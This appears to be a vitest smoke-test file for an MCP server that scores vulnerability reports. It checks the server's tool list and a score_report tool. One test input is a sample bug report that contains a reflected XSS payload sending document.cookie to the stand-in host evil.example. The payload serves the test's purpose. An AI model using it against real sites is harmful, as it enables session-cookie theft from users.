import { describe, it, expect } from "vitest";
import { spawn } from "node:child_process";
import { resolve } from "node:path";
import { once } from "node:events";

const LIVE = process.env["MCP_LIVE"] === "1";

const SERVER_ENTRY = resolve(import.meta.dirname, "../dist/index.js");

interface JsonRpcResponse {
  jsonrpc: "2.0";
  id: number;
  result?: unknown;
  error?: { code: number; message: string };
}

function sendRpc(
  proc: ReturnType<typeof spawn>,
  id: number,
  method: string,
  params: Record<string, unknown> = {},
): void {
  const msg = JSON.stringify({ jsonrpc: "2.0", id, method, params });
  proc.stdin!.write(`Content-Length: ${Buffer.byteLength(msg)}\r\n\r\n${msg}`);
}

function sendNotification(
  proc: ReturnType<typeof spawn>,
  method: string,
  params: Record<string, unknown> = {},
): void {
  const msg = JSON.stringify({ jsonrpc: "2.0", method, params });
  proc.stdin!.write(`Content-Length: ${Buffer.byteLength(msg)}\r\n\r\n${msg}`);
}

async function killProc(proc: ReturnType<typeof spawn>): Promise<void> {
  proc.kill("SIGTERM");
  await once(proc, "exit").catch(() => {});
}

function collectStdout(proc: ReturnType<typeof spawn>): {
  responses: JsonRpcResponse[];
} {
  const responses: JsonRpcResponse[] = [];
  let buffer = "";

  proc.stdout!.setEncoding("utf-8");
  proc.stdout!.on("data", (chunk: string) => {
    buffer += chunk;
    while (true) {
      const headerEnd = buffer.indexOf("\r\n\r\n");
      if (headerEnd === -1) break;
      const headerBlock = buffer.slice(0, headerEnd);
      const match = headerBlock.match(/Content-Length:\s*(\d+)/i);
      if (!match) break;
      const len = parseInt(match[1], 10);
      const bodyStart = headerEnd + 4;
      if (buffer.length < bodyStart + len) break;
      const body = buffer.slice(bodyStart, bodyStart + len);
      buffer = buffer.slice(bodyStart + len);
      try {
        responses.push(JSON.parse(body));
      } catch {}
    }
  });

  return { responses };
}

async function waitForResponse(
  responses: JsonRpcResponse[],
  id: number,
  timeoutMs = 30_000,
): Promise<JsonRpcResponse> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const found = responses.find((r) => r.id === id);
    if (found) return found;
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error(`Timed out waiting for response id=${id}`);
}

describe.skipIf(!LIVE)("live MCP smoke test", () => {
  it(
    "tools/list returns the expected tool set",
    async () => {
      const proc = spawn("node", [SERVER_ENTRY], {
        stdio: ["pipe", "pipe", "pipe"],
        env: { ...process.env },
      });
      try {
        const { responses } = collectStdout(proc);

        sendRpc(proc, 1, "initialize", {
          protocolVersion: "2024-11-05",
          capabilities: {},
          clientInfo: { name: "smoke-test", version: "0.0.1" },
        });

        const initRes = await waitForResponse(responses, 1);
        expect(initRes.error).toBeUndefined();

        sendNotification(proc, "notifications/initialized");
        sendRpc(proc, 2, "tools/list");

        const listRes = await waitForResponse(responses, 2);
        expect(listRes.error).toBeUndefined();
        const tools = (listRes.result as { tools: Array<{ name: string }> })
          .tools;
        const names = tools.map((t) => t.name).sort();
        expect(names).toContain("score_report");
        expect(names).toContain("query_stats");
        expect(names.length).toBeGreaterThanOrEqual(9);

        for (const t of tools) {
          expect(
            (t as { inputSchema?: { type: string } }).inputSchema?.type,
          ).toBe("object");
        }
      } finally {
        await killProc(proc);
      }
    },
    45_000,
  );

  it(
    "score_report returns a valid score for a real report",
    async () => {
      const proc = spawn("node", [SERVER_ENTRY], {
        stdio: ["pipe", "pipe", "pipe"],
        env: { ...process.env },
      });
      try {
        const { responses } = collectStdout(proc);

        sendRpc(proc, 1, "initialize", {
          protocolVersion: "2024-11-05",
          capabilities: {},
          clientInfo: { name: "smoke-test", version: "0.0.1" },
        });
        await waitForResponse(responses, 1);

        sendNotification(proc, "notifications/initialized");

        sendRpc(proc, 2, "tools/call", {
          name: "score_report",
          arguments: {
            text: "A reflected XSS vulnerability was found in the search parameter of /search?q=<script>alert(1)</script>. The application does not sanitise user input before reflecting it in the HTML response. Impact: an attacker can steal session cookies. Steps to reproduce: 1. Navigate to /search?q=<script>document.location='https://evil.example/steal?c='+document.cookie</script> 2. Observe the script executes in the victim's browser.",
            skipLlm: true,
          },
        });

        const callRes = await waitForResponse(responses, 2, 60_000);
        expect(callRes.error).toBeUndefined();

        const result = callRes.result as {
          isError?: boolean;
          content: Array<{ type: string; text: string }>;
        };
        expect(result.isError).toBeFalsy();
        expect(result.content).toHaveLength(1);
        expect(result.content[0].type).toBe("text");

        const payload = JSON.parse(result.content[0].text);
        expect(typeof payload.slopScore).toBe("number");
        expect(payload.slopScore).toBeGreaterThanOrEqual(0);
        expect(payload.slopScore).toBeLessThanOrEqual(100);
      } finally {
        await killProc(proc);
      }
    },
    90_000,
  );
});
